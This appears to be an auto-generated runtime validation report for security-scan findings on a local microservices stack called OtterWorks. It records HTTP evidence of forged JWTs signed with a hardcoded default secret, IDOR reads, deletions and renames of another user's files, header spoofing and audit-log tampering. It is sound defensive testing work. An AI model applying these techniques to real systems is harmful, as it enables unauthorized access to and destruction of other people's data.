# OtterWorks — Runtime Validation of Security-Scan Findings

_Generated 2026-08-05 10:23:40Z against the local `make up` stack._

This report records the **live** result of exercising each reported vulnerability against the running services. A finding is `CONFIRMED` only when the attack actually succeeded at runtime; the raw HTTP evidence is included verbatim. Reproduce with:

```bash
make up seed=1   # bring the stack up
uv run security/runtime-validation/validate_findings.py
python3 security/runtime-validation/gen_report.py
```

## Summary

- **Confirmed at runtime:** 21
- **Not reproduced:** 3 (control works as designed / not runtime-provable here)
- **Skipped (service not running):** 3

| Severity | Service | Finding | Result |
|---|---|---|---|
| critical | admin-service | Missing RBAC: non-admin USER token reaches admin user-management endpoints | CONFIRMED |
| critical | auth/all | Hardcoded default JWT secret -> forge admin token accepted by gateway | CONFIRMED |
| high | admin-service | admin-service reachable directly on :8089 with no authentication | not reproduced |
| high | admin-service | Bulk user operations reachable by non-admin (privilege escalation surface) | CONFIRMED |
| high | admin-service | Feature-flag endpoints reachable by non-admin user | CONFIRMED |
| high | admin-service | System configuration endpoint reachable without admin role | CONFIRMED |
| high | file-service | IDOR: attacker downloads victim's file (presigned URL, no ownership check) | CONFIRMED |
| high | file-service | IDOR: attacker permanently deletes victim's file | CONFIRMED |
| high | file-service | IDOR: attacker renames victim's file | CONFIRMED |
| high | file-service | share_file: attacker shares victim's file / spoofs shared_by | not reproduced |
| high | report-service | Report API endpoints permit all requests without authentication | skipped (service down) |
| high | report-service | SSRF/parameter injection via report 'metric' concatenated into internal URL | skipped (service down) |
| high | search-service | search-service trusts spoofable X-User-ID for tenant isolation (direct :8087) | CONFIRMED |
| medium | admin-service | Admin audit-log endpoint readable by non-admin user | CONFIRMED |
| medium | admin-service | Admin metrics summary readable by non-admin user | CONFIRMED |
| medium | admin-service | Auto-investigate setting reachable by non-admin user | CONFIRMED |
| medium | api-gateway | Gateway does not strip a client-supplied X-User-ID on unauthenticated paths | CONFIRMED |
| medium | api-gateway | Rate limiter keys on spoofable X-Forwarded-For (informational probe) | not reproduced |
| medium | audit-service | Audit-service endpoints reachable by any authenticated user | CONFIRMED |
| medium | audit-service | Audit log tampering: caller supplies arbitrary actor UserId | CONFIRMED |
| medium | auth-service | Unauthenticated endpoints expose user PII (emails) | skipped (service down) |
| medium | document-service | IDOR: list victim's documents via ?owner_id= query parameter | CONFIRMED |
| medium | document-service | Document search endpoint is unauthenticated and unscoped | CONFIRMED |
| medium | document-service | Comment endpoints lack authentication / spoofable authorship | CONFIRMED |
| medium | file-service | IDOR: attacker reads victim's file metadata | CONFIRMED |
| medium | file-service | create_folder trusts client-supplied owner_id | CONFIRMED |
| medium | search-service | Search index mutation reachable by any authenticated user (no admin role) | CONFIRMED |

## Confirmed findings — evidence

### [CRITICAL] admin-service — Missing RBAC: non-admin USER token reaches admin user-management endpoints
`sfind-8c2faefb5c2e46f5b5117ac6c288cf7e`

```
forged token with roles=[USER] only
GET /api/v1/admin/users via gateway -> HTTP 200 :: {"users":[{"id":"5eed0010-0000-4000-a000-000000000010","email":"james.park@otterworks.io","display_name":"James Park","role":"editor","status":"active","avatar_url":null,"metadata"
```

### [CRITICAL] auth/all — Hardcoded default JWT secret -> forge admin token accepted by gateway
`sfind-29d5a2e3361e46fc8f120098eeb80fb8`

```
forged ADMIN token signed with default secret
GET /api/v1/files via gateway -> HTTP 200 :: {"files":[],"total":0,"page":1,"page_size":50}
control: tampered token -> HTTP 401 :: {"error":"invalid token: token signature is invalid: signature is invalid"} 
```

### [HIGH] admin-service — Bulk user operations reachable by non-admin (privilege escalation surface)
`sfind-71eabd8200db416ab02add48baa781c2`

```
forged roles=[USER]; POST /api/v1/admin/bulk/users with empty user_ids
-> HTTP 400 :: {"error":"Missing parameter: operation"}
```

### [HIGH] admin-service — Feature-flag endpoints reachable by non-admin user
`sfind-79af2ccf067442ec87398840d0136a4f`

```
GET /api/v1/admin/features roles=[USER] -> HTTP 200 :: {"features":[{"id":"81a34bd5-b774-4b29-9443-04a7d2f5d853","name":"advanced_search_filters","description":"Extended search filters powered by MeiliSearch facets","enabled":true,"tar
```

### [HIGH] admin-service — System configuration endpoint reachable without admin role
`sfind-6239363956ad43819496c0d778b29987`

```
GET /api/v1/admin/config roles=[USER] -> HTTP 200 :: {"configs":[]}
```

### [HIGH] file-service — IDOR: attacker downloads victim's file (presigned URL, no ownership check)
`sfind-b58d42f02e034fbb83a48b7a70ce2bbd`

```
victim 0546ba7c uploaded file a72038d7-8207-402a-a330-d08f268c90dc
attacker c604305d GET /files/a72038d7-8207-402a-a330-d08f268c90dc/download -> HTTP 200 :: {"url":"http://localstack:4566/otterworks-files/files/0546ba7c-4fb4-455e-a3a7-b90389f332f9/a72038d7-8207-402a-a330-d08f268c90dc?x-id=GetObject&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Am
```

### [HIGH] file-service — IDOR: attacker permanently deletes victim's file
`sfind-097ed93b52ad496ebfea31a5cedfd82d`

```
victim file 22300419-0cd6-482a-bc17-42a83cfd3a03; attacker DELETE /files/22300419-0cd6-482a-bc17-42a83cfd3a03 -> HTTP 204 :: 
victim re-fetch after delete -> HTTP 404 :: {"error":"file_not_found","message":"File not found: 22300419-0cd6-482a-bc17-42a83cfd3a03"}
```

### [HIGH] file-service — IDOR: attacker renames victim's file
`sfind-2126634b219e45579bd9b30d41064af8`

```
victim file ff67fa25-e13b-43bd-bdb3-114b4bdc82d9; attacker PATCH /files/ff67fa25-e13b-43bd-bdb3-114b4bdc82d9/rename -> HTTP 200 :: {"id":"ff67fa25-e13b-43bd-bdb3-114b4bdc82d9","name":"pwned-by-attacker.txt","mime_type":"text/plain","size_bytes":26,"s3_key":"files/0546ba7c-4fb4-455e-a3a7-b90389f332f9/ff67fa25-e
```

### [HIGH] search-service — search-service trusts spoofable X-User-ID for tenant isolation (direct :8087)
`sfind-9d81ab3c5c474e25bccdd668862677fd`

```
direct :8087 search with spoofed X-User-ID=victim -> HTTP 200 :: {"page":1,"page_size":20,"query":"test","results":[],"total":0} 
```

### [MEDIUM] admin-service — Admin audit-log endpoint readable by non-admin user
`sfind-2e939691283c4513a8be08e9f33eb972`

```
GET /api/v1/admin/audit-logs roles=[USER] -> HTTP 200 :: {"audit_logs":[{"id":"d466e7ce-8825-4262-8884-457d9aaf2a37","actor_id":"5eed0001-0000-4000-a000-000000000001","actor_email":"alice.johnson@otterworks.io","action":"user.suspended",
```

### [MEDIUM] admin-service — Admin metrics summary readable by non-admin user
`sfind-c78e64751be640ee9fd64acbb50330bc`

```
GET /api/v1/admin/metrics/summary roles=[USER] -> HTTP 200 :: {"timestamp":"2026-08-05T10:22:54Z","users":{"total":10,"active":9,"suspended":1,"by_role":{"admin":1,"viewer":3,"super_admin":1,"editor":5},"recent_signups":1},"storage":{"total_a
```

### [MEDIUM] admin-service — Auto-investigate setting reachable by non-admin user
`sfind-a1f8ff97dd2649ae8396aa0f08ed1c23`

```
GET /api/v1/admin/settings/auto_investigate roles=[USER] -> HTTP 200 :: {"enabled":true}
```

### [MEDIUM] api-gateway — Gateway does not strip a client-supplied X-User-ID on unauthenticated paths
`sfind-fd26367a91214544b976ee5b68f5a3fa`

```
forged token with empty sub + client X-User-ID=victim
GET /api/v1/search/ via gateway -> HTTP 200 :: {"page":1,"page_size":20,"query":"test","results":[],"total":0} 
```

### [MEDIUM] audit-service — Audit-service endpoints reachable by any authenticated user
`sfind-c00942cea87047f8895202b6dd0b1fc7`

```
GET /api/v1/audit/events roles=[USER] -> HTTP 200 :: {"events":[{"id":"4873ad2f-9084-40ac-9489-baa936a0b6b5","userId":"system","action":"unknown","resourceType":"unknown","resourceId":"","details":null,"ipAddress":null,"userAgent":nu
direct :8090/api/v1/audit/events (no auth) -> HTTP 200 :: {"events":[{"id":"4873ad2f-9084-40ac-9489-baa936a0b6b5","userId":"system","action":"unknown","resourceType":"unknown","resourceId":"","details":null,"ipAddress":null,"userAgent":nu
```

### [MEDIUM] audit-service — Audit log tampering: caller supplies arbitrary actor UserId
`sfind-9240c3d9fe2f43d494cb7c771f466a5d`

```
POST /api/v1/audit/events with userId=victim (attacker token) -> HTTP 201 :: {"id":"68d78b4a-85bd-478c-9cad-c783233ff3b3","userId":"0546ba7c-4fb4-455e-a3a7-b90389f332f9","action":"SPOOFED_ACTION","resourceType":"file","resourceId":"x","details":null,"ipAddr
```

### [MEDIUM] document-service — IDOR: list victim's documents via ?owner_id= query parameter
`sfind-c786c0e2694d489192245dd3ce80a32d`

```
victim 0546ba7c created document 0615fd6c-cf0c-48e1-a76d-3840fd56a7e2
attacker GET /documents?owner_id=victim -> HTTP 200 :: {"items":[{"id":"0615fd6c-cf0c-48e1-a76d-3840fd56a7e2","title":"victim confidential doc","content":"secret body","content_type":"text/markdown","owner_id":"0546ba7c-4fb4-455e-a3a7-
```

### [MEDIUM] document-service — Document search endpoint is unauthenticated and unscoped
`sfind-5c456ebfb4614ceabaaaba1c335d326f`

```
victim doc e2a9212d-ed35-408c-86fb-69ffd5b277a6 titled 'marker-192f0587 ...'
unauthenticated GET /documents/search?q=marker-192f0587 -> HTTP 200 :: {"items":[{"id":"e2a9212d-ed35-408c-86fb-69ffd5b277a6","title":"marker-192f0587 confidential","content":"secret body","content_type":"text/markdown","owner_id":"0546ba7c-4fb4-455e-
```

### [MEDIUM] document-service — Comment endpoints lack authentication / spoofable authorship
`sfind-90121428e66d449a89708899b709fcae`

```
unauthenticated POST /documents/de02870a-9763-4e91-adcc-744ffde9dd81/comments (author spoofed=victim) -> HTTP 201 :: {"id":"713cda10-08d6-407f-9431-fc34653bbc6a","document_id":"de02870a-9763-4e91-adcc-744ffde9dd81","author_id":"0546ba7c-4fb4-455e-a3a7-b90389f332f9","content":"spoofed comment","cr
```

### [MEDIUM] file-service — IDOR: attacker reads victim's file metadata
`sfind-2a38deab8b534ad6a380750ffd320280`

```
victim file 3c637bf3-6037-4af8-82ac-f8b205a84c94; attacker GET /files/3c637bf3-6037-4af8-82ac-f8b205a84c94 -> HTTP 200 :: {"id":"3c637bf3-6037-4af8-82ac-f8b205a84c94","name":"victim-secret.txt","mime_type":"text/plain","size_bytes":26,"s3_key":"files/0546ba7c-4fb4-455e-a3a7-b90389f332f9/3c637bf3-6037-
```

### [MEDIUM] file-service — create_folder trusts client-supplied owner_id
`sfind-38bf5c64e80b4802b668fb4f71316fe5`

```
attacker POST /folders with owner_id=victim -> HTTP 201 :: {"id":"56b125b7-acce-4744-be6f-d04209f2360c","name":"spoofed","parent_id":null,"owner_id":"0546ba7c-4fb4-455e-a3a7-b90389f332f9","created_at":"2026-08-05T10:22:54.875085095Z","upda
```

### [MEDIUM] search-service — Search index mutation reachable by any authenticated user (no admin role)
`sfind-d05306417bdf4373bd9fd548dddb0bcf`

```
POST /search/index/document as roles=[USER] w/ arbitrary owner_id -> HTTP 201 :: {"id":"5c6dd6cd-ab3b-4c37-a694-6a374f337bee","status":"indexed","type":"document"} 
```

## Skipped — service could not be built/run

The JVM services (auth / report / notification / analytics) could not be built in this environment due to a persistent upstream Maven/Gradle `HTTP 429 Too Many Requests` rate limit. The findings below are **code-confirmed** by the scan but were not exercised at runtime here; re-run the harness once those images build.

- **[HIGH] report-service** — Report API endpoints permit all requests without authentication (`sfind-9bc92db4451b4d0e91bb9c17f16711be`)
- **[HIGH] report-service** — SSRF/parameter injection via report 'metric' concatenated into internal URL (`sfind-2385926b9bef4a92b296086559a7dc9b`)
- **[MEDIUM] auth-service** — Unauthenticated endpoints expose user PII (emails) (`sfind-d3ec7433c3c64c2689185e03738d6a51`)

## Not reproduced at runtime

### [HIGH] admin-service — admin-service reachable directly on :8089 with no authentication
`sfind-10b2654f0f354c02aae4d3b270a2ad00`

```
GET :8089/api/v1/admin/users (no auth, no gateway) -> HTTP 401 :: {"error":"Missing authorization token"}
```

### [HIGH] file-service — share_file: attacker shares victim's file / spoofs shared_by
`sfind-3058859af83e44bdaa7785f17ecfa826`

```
victim file 22878dcd-1e84-40e4-98bb-6b43788f55e1; attacker POST /files/22878dcd-1e84-40e4-98bb-6b43788f55e1/share (shared_by spoofed=victim) -> HTTP 400 :: Json deserialize error: unknown variant `read`, expected `viewer` or `editor` at line 1 column 129
```

### [MEDIUM] api-gateway — Rate limiter keys on spoofable X-Forwarded-For (informational probe)
`sfind-489d8ee4470a4030b8fd1cac87f1c0b4`

```
5x GET /api/v1/auth/login with rotating X-Forwarded-For -> [502, 502, 502, 502, 502]
Note: distinct XFF values are accepted as distinct clients; code review confirms XFF is used as the rate-limit key.
```
